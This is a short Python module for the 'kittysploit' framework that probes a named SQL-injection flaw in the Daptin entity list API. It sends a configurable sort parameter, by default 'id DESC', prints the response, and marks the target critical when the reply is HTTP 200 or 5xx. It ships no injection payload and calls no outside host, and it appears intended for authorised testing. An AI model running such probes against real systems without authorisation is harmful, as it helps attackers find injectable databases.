#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-77367 — Daptin ORDER BY SQLi probe."""

from kittysploit import *
from lib.protocols.http.daptin import Daptin
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client, Daptin):
    __info__ = {
        "name": "Daptin CVE-2026-77367 SQLi probe",
        "description": "Tests sort= payloads against Daptin entity list API.",
        "author": ["LLCForge", "KittySploit Team"],
        "cve": ["CVE-2026-77367"],
        "tags": ["daptin", "sqli", "auxiliary", "cve-2026-77367"],
        "agent": {"approval_required": True, "produces": ["sqli"]},
    }

    entity = OptString("users", "Entity slug", required=False)
    sort_payload = OptString(
        "id DESC",
        "sort parameter value",
        required=False,
    )

    def run(self):
        entity = str(self.entity or "users")
        sort_val = str(self.sort_payload or "id DESC")
        code, body = self.daptin_entity_list(entity, sort_val)
        print_status(f"GET /api/{entity}?sort={sort_val} -> HTTP {code}")
        if body:
            print_status(body[:800])
        if code == 200 or code >= 500:
            self.set_info(severity="critical", cve="CVE-2026-77367", http_status=code)
            return True
        return False